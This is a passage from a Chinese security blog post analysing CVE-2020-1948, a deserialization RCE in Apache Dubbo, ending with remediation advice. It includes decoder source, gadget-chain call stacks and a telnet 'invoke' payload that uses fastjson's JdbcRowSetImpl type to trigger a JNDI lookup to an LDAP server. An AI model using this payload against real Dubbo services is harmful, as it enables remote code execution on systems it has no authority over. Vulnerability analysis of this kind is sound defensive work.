<pre><code class="language-java">    protected Object decodeEventData(Channel channel, ObjectInput in) throws IOException {
        try {
            return in.readEvent();
        } catch (ClassNotFoundException | IOException var4) {
            throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var4));
        }
    }
</code></pre>
<p>再继续跟进 <strong>ObjectInput#readEvent</strong> 方法就会来到readObject入口了，这里就和前面漏洞提交的触发利用链一致了。</p>
<pre><code class="language-java">    default Object readEvent() throws IOException, ClassNotFoundException {
        return this.readObject();
    }
</code></pre>
<p>这里再提一点， <strong>@threedr3am</strong> 师傅为了满足进入这个逻辑进行触发，做了一些特殊的header处理。这里我们可以看到 <strong>flag</strong> 的<strong>byte</strong>为-94，<strong>proto</strong>的<strong>byte</strong>为2，前面我们提过<code>2--&gt;&quot;org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization</code>。</p>
<figure data-type="image" tabindex="11"><img src="http://l1nk3r.xmutsec.com/blog/dc3vj.png" alt="image-20200702133628451" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="http://l1nk3r.xmutsec.com/blog/zciba.png" alt="image-20200702133801946" loading="lazy"></figure>
<p>调用栈</p>
<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:338, HashMap (java.util)
put:611, HashMap (java.util)
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2733, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2308, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:93, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
readEvent:83, ObjectInput (org.apache.dubbo.common.serialize)
decodeEventData:400, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decodeBody:122, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:85, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)
</code></pre>
<h2 id="0x05-后话">0x05 后话</h2>
<p>期间在调试过程中，发现一些师傅发了一种利用telnet直接连接端口配合 <strong>fastjson</strong> 执行的情况。</p>
<pre><code>invoke com.baidu.hellofastjson(&quot;aa&quot;,{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/chober&quot;,&quot;autoCommit&quot;:true}}, &quot;poc&quot;:11})
</code></pre>
<figure data-type="image" tabindex="13"><img src="http://l1nk3r.xmutsec.com/blog/gmpcm.png" alt="image-20200702134957343" loading="lazy"></figure>
<p>核心点在这里 <strong>HeaderExchangeHandler#received</strong> ，遇到<code>message instanceof String</code>的情况，就会转发到 <strong>TelnetHandlerAdapter#telnet</strong> 方法进行处理</p>
<pre><code class="language-java">    public void received(Channel channel, Object message) throws RemotingException {
        ExchangeChannel exchangeChannel = HeaderExchangeChannel.getOrAddChannel(channel);
        if (message instanceof Request) {
            Request request = (Request)message;
            if (request.isEvent()) {
                this.handlerEvent(channel, request);
            } else if (request.isTwoWay()) {
                this.handleRequest(exchangeChannel, request);
            } else {
                this.handler.received(exchangeChannel, request.getData());
            }
        } else if (message instanceof Response) {
            handleResponse(channel, (Response)message);
        } else if (message instanceof String) {
            if (isClientSide(channel)) {
                Exception e = new Exception(&quot;Dubbo client can not supported string message: &quot; + message + &quot; in channel: &quot; + channel + &quot;, url: &quot; + channel.getUrl());
                logger.error(e.getMessage(), e);
            } else {
                String echo = this.handler.telnet(channel, (String)message);
                if (echo != null &amp;&amp; echo.length() &gt; 0) {
                    channel.send(echo);
                }
            }
        } else {
            this.handler.received(exchangeChannel, message);
        }
</code></pre>
<p>跟进 <strong>TelnetHandlerAdapter#telnet</strong> 获取前缀<code>dubbo&gt;</code>中内容。</p>
<pre><code class="language-java">public String telnet(Channel channel, String message) throws RemotingException {
    String prompt = channel.getUrl().getParameterAndDecoded(&quot;prompt&quot;, &quot;dubbo&gt;&quot;);
		...
    if (command.length() &gt; 0) {
        if (this.extensionLoader.hasExtension(command)) {
            if (this.commandEnabled(channel.getUrl(), command)) {
                try {
                    String result = ((TelnetHandler)this.extensionLoader.getExtension(command)).telnet(channel, message);
</code></pre>
<figure data-type="image" tabindex="14"><img src="http://l1nk3r.xmutsec.com/blog/xuloi.png" alt="image-20200702135546466" loading="lazy"></figure>
<p>在<code>extensionLoader.hasExtension(command)</code>会进行处理，当出现时 <strong>invoke</strong> 关键字的时候，自然是进入<code>org.apache.dubbo.qos.legacy.InvokeTelnetHandler</code>处理。</p>
<figure data-type="image" tabindex="15"><img src="http://l1nk3r.xmutsec.com/blog/42oq9.png" alt="image-20200702135919660" loading="lazy"></figure>
<p>还有一些其他方法。</p>
<pre><code>ls=org.apache.dubbo.qos.legacy.ListTelnetHandler
ps=org.apache.dubbo.qos.legacy.PortTelnetHandler
cd=org.apache.dubbo.qos.legacy.ChangeTelnetHandler
pwd=org.apache.dubbo.qos.legacy.CurrentTelnetHandler
invoke=org.apache.dubbo.qos.legacy.InvokeTelnetHandler
trace=org.apache.dubbo.qos.legacy.TraceTelnetHandler
count=org.apache.dubbo.qos.legacy.CountTelnetHandler
select=org.apache.dubbo.qos.legacy.SelectTelnetHandler
shutdown=org.apache.dubbo.qos.legacy.ShutdownTelnetHandler
</code></pre>
<p>在 <strong>InvokeTelnetHandler#telnet</strong> 会触发 <strong>JSON.parseArray</strong> 操作，如果是低版本 <strong>fastjson</strong> ，你懂的。</p>
<pre><code class="language-java">    public String telnet(Channel channel, String message) {
        if (StringUtils.isEmpty(message)) {
        	...
                try {
                    list = JSON.parseArray(&quot;[&quot; + args + &quot;]&quot;, Object.class);
</code></pre>
<p>附上到这里的调用栈</p>
<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
...
parseArray:535, JSON (com.alibaba.fastjson)
telnet:81, InvokeTelnetHandler (org.apache.dubbo.qos.legacy)
telnet:59, TelnetHandlerAdapter (org.apache.dubbo.remoting.telnet.support)
received:187, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
</code></pre>
<h2 id="0x06-修复建议">0x06 修复建议</h2>
<p>• 出网限制</p>
<p>经研究当前存在的反序列化利用链大多需要远程加载恶意类，如果没有特殊需求，建议在不影响业务的情况下将服务器配置出外网限制。</p>
<p>• IP白名单</p>
<p>建议用户将能够连接至Dubbo服务端的消费端IP加入到可信IP白名单里，并在服务端配置可信IP白名单，以防止攻击者在外部直接发起连接请求。</p>
<p>• 更换默认的反序列化方式</p>
<p>Dubbo协议默认采用Hessian作为序列化反序列化方式，而Hessian存在危险的反序列化漏洞。用户可以在考虑不影响业务的情况下更换协议以及反序列化方式，如：rest，grpc，thrift等。</p>
<p>• 关闭公网端口</p>
<p>不要将Dubbo服务端的开放端口暴露在公网，但需要注意这种场景若攻击者在内网环境仍然可以进行攻击。</p>
<h2 id="reference">Reference</h2>
<p><a href="https://www.mail-archive.com/search?l=dev@dubbo.apache.org&amp;q=subject:%22%5BCVE-2020-1948%5D+Apache+Dubbo+Provider+default+deserialization+cause+RCE%22&amp;o=newest">Apache Dubbo Provider default deserialization cause RCE</a></p>
<p><a href="https://www.anquanke.com/post/id/197658#h3-5">dubbo源码浅析：默认反序列化利用之hessian2</a></p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0">0x01 漏洞描述</a></li>
<li><a href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x02 环境搭建</a>
<ul>
<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF">服务端</a></li>
<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a></li>
</ul>
</li>
<li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x03 漏洞分析</a>
<ul>
<li><a href="#1-readobject%E5%85%A5%E5%8F%A3">1、readobject入口</a></li>
<li><a href="#2-tostring%E5%85%A5%E5%8F%A3">2、toString入口</a></li>
</ul>
</li>
<li><a href="#0x04-%E8%A1%A5%E4%B8%81%E4%BB%A5%E5%8F%8A%E7%BB%95%E8%BF%87">0x04 补丁以及绕过</a>
<ul>
<li><a href="#1-%E7%BB%95%E8%BF%87args%E9%99%90%E5%88%B6">1、绕过args限制</a></li>
<li><a href="#2-%E5%AF%BB%E6%89%BE%E6%96%B0%E7%9A%84readobject%E5%85%A5%E5%8F%A3">2、寻找新的readObject入口</a></li>
</ul>
</li>
<li><a href="#0x05-%E5%90%8E%E8%AF%9D">0x05 后话</a></li>
<li><a href="#0x06-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x06 修复建议</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://blog.xray.cool/post/java-el-injection-nexus-rce/">
              <h3 class="post-title">
                java el 2.1 表达式注入payload(复现上古版本nexus rce)
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
